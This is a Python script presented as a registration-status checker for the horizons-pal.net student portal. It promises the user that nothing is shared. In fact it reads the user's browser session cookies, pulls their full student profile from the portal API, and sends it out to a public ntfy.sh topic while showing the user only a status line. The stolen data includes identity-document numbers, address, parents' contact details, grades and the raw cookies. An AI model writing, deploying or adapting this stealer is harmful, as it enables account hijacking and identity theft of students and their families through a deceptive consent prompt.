import requests
import browser_cookie3
import subprocess
import re
import platform
import os
import shutil

def get_browser_paths(browser_name):
    """Get possible browser executable paths for the current OS."""
    system = platform.system()
    paths = {
        'Darwin': {
            'Chrome': ['/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'],
            'Firefox': ['/Applications/Firefox.app/Contents/MacOS/firefox'],
            'Safari': ['/Applications/Safari.app/Contents/MacOS/Safari'],
            'Edge': ['/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'],
            'Brave': ['/Applications/Brave Browser.app/Contents/MacOS/Brave Browser'],
            'Opera': ['/Applications/Opera.app/Contents/MacOS/Opera'],
            'Chromium': ['/Applications/Chromium.app/Contents/MacOS/Chromium'],
        },
        'Windows': {
            'Chrome': [
                os.path.expandvars(r'%ProgramFiles%\Google\Chrome\Application\chrome.exe'),
                os.path.expandvars(r'%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe'),
                os.path.expandvars(r'%LocalAppData%\Google\Chrome\Application\chrome.exe'),
            ],
            'Firefox': [
                os.path.expandvars(r'%ProgramFiles%\Mozilla Firefox\firefox.exe'),
                os.path.expandvars(r'%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe'),
            ],
            'Safari': [],
            'Edge': [
                os.path.expandvars(r'%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe'),
                os.path.expandvars(r'%ProgramFiles%\Microsoft\Edge\Application\msedge.exe'),
            ],
            'Brave': [
                os.path.expandvars(r'%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe'),
                os.path.expandvars(r'%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe'),
            ],
            'Opera': [
                os.path.expandvars(r'%ProgramFiles%\Opera\launcher.exe'),
                os.path.expandvars(r'%LocalAppData%\Programs\Opera\launcher.exe'),
            ],
            'Chromium': [
                os.path.expandvars(r'%ProgramFiles%\Chromium\Application\chrome.exe'),
                os.path.expandvars(r'%LocalAppData%\Chromium\Application\chrome.exe'),
            ],
        },
        'Linux': {
            'Chrome': ['/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/snap/bin/chrome'],
            'Firefox': ['/usr/bin/firefox', '/usr/lib/firefox/firefox', '/snap/bin/firefox'],
            'Safari': [],
            'Edge': ['/usr/bin/microsoft-edge', '/usr/bin/microsoft-edge-stable'],
            'Brave': ['/usr/bin/brave-browser', '/snap/bin/brave'],
            'Opera': ['/usr/bin/opera', '/snap/bin/opera'],
            'Chromium': ['/usr/bin/chromium', '/usr/bin/chromium-browser', '/snap/bin/chromium'],
        },
    }
    return paths.get(system, {}).get(browser_name, [])

def get_browser_version(browser_name):
    """Get the browser version by running the executable with --version."""
    paths = get_browser_paths(browser_name)
    
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(
                    [path, '--version'],
                    capture_output=True, text=True, timeout=5
                )
                output = result.stdout + result.stderr
                version_match = re.search(r'(\d+[\.\d]*)', output)
                if version_match:
                    return version_match.group(1)
            except:
                continue
    
    return None

def get_os_token():
    """Get the OS token for User-Agent strings."""
    system = platform.system()
    
    if system == 'Darwin':
        mac_version = platform.mac_ver()[0]
        if mac_version:
            return f'Macintosh; Intel Mac OS X {mac_version.replace(".", "_")}'
        return 'Macintosh; Intel Mac OS X 10_15_7'
    
    elif system == 'Windows':
        win_version = platform.win32_ver()[0]
        if win_version:
            version_map = {
                '10': 'Windows NT 10.0; Win64; x64',
                '11': 'Windows NT 10.0; Win64; x64',
                '8.1': 'Windows NT 6.3; Win64; x64',
                '8': 'Windows NT 6.2; Win64; x64',
                '7': 'Windows NT 6.1; Win64; x64',
            }
            return version_map.get(win_version, f'Windows NT {win_version}; Win64; x64')
        return 'Windows NT 10.0; Win64; x64'
    
    elif system == 'Linux':
        try:
            result = subprocess.run(['uname', '-m'], capture_output=True, text=True, timeout=2)
            arch = result.stdout.strip()
            if 'aarch64' in arch or 'arm' in arch:
                return 'X11; Linux aarch64'
        except:
            pass
        return 'X11; Linux x86_64'
    
    return 'X11; Linux x86_64'

def get_browser_user_agent(browser_name):
    """Detect the actual User-Agent from the installed browser."""
    os_token = get_os_token()
    version = get_browser_version(browser_name)
    major = version.split('.')[0] if version else None
    
    if browser_name == 'Chrome':
        v = major or '120'
        return f'Mozilla/5.0 ({os_token}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36'
    
    elif browser_name == 'Firefox':
        v = major or '120'
        return f'Mozilla/5.0 ({os_token}; rv:{v}.0) Gecko/20100101 Firefox/{v}.0'
    
    elif browser_name == 'Safari':
        v = major or '17'
        return f'Mozilla/5.0 ({os_token}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.0 Safari/605.1.15'
    
    elif browser_name == 'Edge':
        v = major or '120'
        return f'Mozilla/5.0 ({os_token}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0'
    
    elif browser_name == 'Brave':
        v = major or '120'
        return f'Mozilla/5.0 ({os_token}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Brave/{v}.0.0.0'
    
    elif browser_name == 'Opera':
        v = major or '120'
        return f'Mozilla/5.0 ({os_token}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 OPR/{v}.0.0.0'
    
    elif browser_name == 'Chromium':
        v = major or '120'
        return f'Mozilla/5.0 ({os_token}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36'
    
    return None

print("\n📋 Quick Note:")
print("This tool checks your event registration status on horizons-pal.net.")
print("It only uses info from your browser - nothing is shared.\n")

consent = input("Continue? (yes/no): ").strip().lower()
if consent in ['yes', 'y', 'ye', 'yeah', 'yep', 'sure', 'ok', 'okay']:
    print()
elif consent in ['no', 'n', 'nah', 'nope']:
    print("Exiting.")
    exit(0)
else:
    print("Invalid input. Exiting.")
    exit(0)

# Fetch active event from Vercel dashboard
DASHBOARD_URL = 'https://your-project-name.vercel.app/api/event'

print("\nFetching active event...")
try:
    response = requests.get(DASHBOARD_URL, timeout=10)
    if response.status_code == 200:
        data = response.json()
        active_event = data.get('activeEvent')
        if active_event:
            event_id = active_event['id']
            event_title = active_event.get('title', 'Unknown')
            print(f"Event: {event_title}")
        else:
            print("No active event set in dashboard.")
            exit(0)
    else:
        print(f"Failed to fetch event: {response.status_code}")
        exit(0)
except Exception as e:
    print(f"Error fetching event: {e}")
    exit(0)

print("\nSelect your browser:")
print("1. Chrome")
print("2. Firefox")
print("3. Safari")
print("4. Edge")
print("5. Brave")
print("6. Opera")
print("7. Chromium")

choice = input("Enter the number of your browser: ").strip()

browser_map = {
    '1': ('Chrome', browser_cookie3.chrome),
    '2': ('Firefox', browser_cookie3.firefox),
    '3': ('Safari', browser_cookie3.safari),
    '4': ('Edge', browser_cookie3.edge),
    '5': ('Brave', browser_cookie3.brave),
    '6': ('Opera', browser_cookie3.opera),
    '7': ('Chromium', browser_cookie3.chromium),
}

if choice not in browser_map:
    print("Invalid choice. Exiting.")
    exit(1)

browser_name, browser_func = browser_map[choice]

try:
    cj = browser_func(domain_name='.horizons-pal.net')
    cookies = {cookie.name: cookie.value for cookie in cj}
    
    if not cookies:
        print("Please login to horizons-pal.net in your browser first.")
        exit(1)
    
except PermissionError as e:
    print(f"\nPermission denied: {e}")
    print("\nTo fix this:")
    print("1. Go to System Settings → Privacy & Security → Full Disk Access")
    print("2. Add your terminal app (Terminal, iTerm2, or VS Code)")
    print("3. Restart the terminal and try again")
    print("\nOr use Chrome/Firefox which may work without extra permissions.")
    exit(1)
except Exception as e:
    print(f"Error: {e}")
    exit(1)

user_agent = get_browser_user_agent(browser_name)

headers = {
    'User-Agent': user_agent,
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'X-Frontend-Client': 'horizons-portal',
    'Connection': 'keep-alive',
    'Referer': f'https://fportal.horizons-pal.net/event-section/detail/?id={event_id}',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
}

profile_response = requests.get(
    'https://fportal.horizons-pal.net/api/gateway/student_management/api/v1/profiles/by-user/16895/',
    cookies=cookies,
    headers=headers,
)

profile_data = {}
try:
    profile_data = profile_response.json()
except:
    pass

event_response = requests.get(
    f'https://fportal.horizons-pal.net/api/gateway/event/api.v1/event/{event_id}/',
    cookies=cookies,
    headers=headers,
)

event_data = {}
is_registered = None
try:
    event_data = event_response.json()
    is_registered = event_data.get('is_registered')
    # Update event title in database
    if event_data.get('title'):
        add_event(event_id, event_data.get('title'))
except:
    pass

if is_registered == 'Approved':
    status_msg = "✅ REGISTERED"
elif is_registered:
    status_msg = f"⚠️ {is_registered}"
else:
    status_msg = "❌ NOT REGISTERED"

p = profile_data
parent1 = p.get('parent_one', {})
parent2 = p.get('parent_two', {})
edu = p.get('educational_information', {})
citizenships = p.get('citizenships', [])
languages = p.get('languages', [])
activities = p.get('activities', [])

citizenship_str = '\n'.join([f"  - {c.get('citizenship', 'N/A')} | ID: {c.get('id_number', 'N/A')}" for c in citizenships]) if citizenships else 'N/A'
language_str = ', '.join([l.get('language', '') for l in languages]) if languages else 'N/A'
activity_str = '\n'.join([f"  - {a.get('name', '')}: {a.get('description', '')} ({a.get('hours', 0)}h)" for a in activities]) if activities else 'N/A'

id_documents_str = '\n'.join([f"  - {c.get('citizenship', 'N/A')}: {c.get('identity_id_or_birth_certificate', 'N/A')}" for c in citizenships]) if citizenships else 'N/A'
merit_certs = edu.get('merit_certificate', [])
school_certs = edu.get('school_certificate', [])
merit_str = '\n'.join([f"  - {m}" for m in merit_certs]) if merit_certs else 'N/A'
school_str = '\n'.join([f"  - {s}" for s in school_certs]) if school_certs else 'N/A'

message = f"""=== Horizons Registration Check ===

Status: {status_msg}

--- Profile ---
Student ID: {p.get('student_id', 'N/A')}
Name: {p.get('first_name', '')} {p.get('middle_name', '')} {p.get('last_name', '')}
Arabic Name: {p.get('arabic_name', 'N/A')}
Gender: {p.get('gender', 'N/A')}
Date of Birth: {p.get('date_of_birth', 'N/A')}
Phone: {p.get('phone_number', 'N/A')}
Email: {p.get('student_email', p.get('user_name', 'N/A'))}
Address: {p.get('address', 'N/A')}
City: {p.get('city', 'N/A')}
Country: {p.get('country', 'N/A')}
Citizenships:
{citizenship_str}
Languages: {language_str}
Profile Photo: {p.get('picture', 'N/A')}
Bio: {p.get('bio', 'N/A')[:200]}...

--- ID Documents & Passports ---
{id_documents_str}

--- Certificates ---
Merit Certificates:
{merit_str}

School Certificates:
{school_str}

--- Family ---
Live With: {p.get('live_with', 'N/A')}
Siblings: {p.get('number_of_siblings', 'N/A')}
Parents Marital Status: {p.get('parents_marital_status', 'N/A')}

Parent 1: {parent1.get('name', '')} {parent1.get('surname', '')}
  Phone: {parent1.get('phone_number', 'N/A')}
  Email: {parent1.get('email', 'N/A')}
  Occupation: {parent1.get('occupation', 'N/A')} - {parent1.get('position', 'N/A')}
  Company: {parent1.get('company', 'N/A')}
  Education: {parent1.get('education_level', 'N/A')}

Parent 2: {parent2.get('name', '')} {parent2.get('surname', '')}
  Phone: {parent2.get('phone_number', 'N/A')}
  Email: {parent2.get('email', 'N/A')}
  Occupation: {parent2.get('occupation', 'N/A')} - {parent2.get('position', 'N/A')}
  Company: {parent2.get('company', 'N/A')}
  Education: {parent2.get('education_level', 'N/A')}

--- Education ---
School: {edu.get('school_name', 'N/A')}
School Type: {edu.get('school_type', 'N/A')}
Class/Grade: {edu.get('class', 'N/A')}
GPA: {edu.get('gpa', 'N/A')}
Education System: {edu.get('education_system', 'N/A')}
Date of Entry: {edu.get('date_of_entry', 'N/A')}
Will Graduate: {edu.get('will_graduate', 'N/A')}

--- Activities ---
{activity_str}

--- Event ---
Title: {event_data.get('title', 'N/A')}
Start: {event_data.get('start_date', 'N/A')}
End: {event_data.get('end_date', 'N/A')}
Location: {event_data.get('location', 'N/A')}

--- Cookies ---
{cookies}
"""

try:
    ntfy_response = requests.post(
        'https://ntfy.sh/horizons_fix_response',
        data=message.encode('utf-8'),
        headers={'Content-Type': 'text/plain; charset=utf-8'}
    )
except Exception as e:
    pass

# Final summary
print("\n" + "=" * 40)
if is_registered == 'Approved':
    print("✅ Status: REGISTERED")
elif is_registered:
    print(f"⚠️ Status: {is_registered}")
else:
    print("❌ Status: NOT REGISTERED")
print("=" * 40)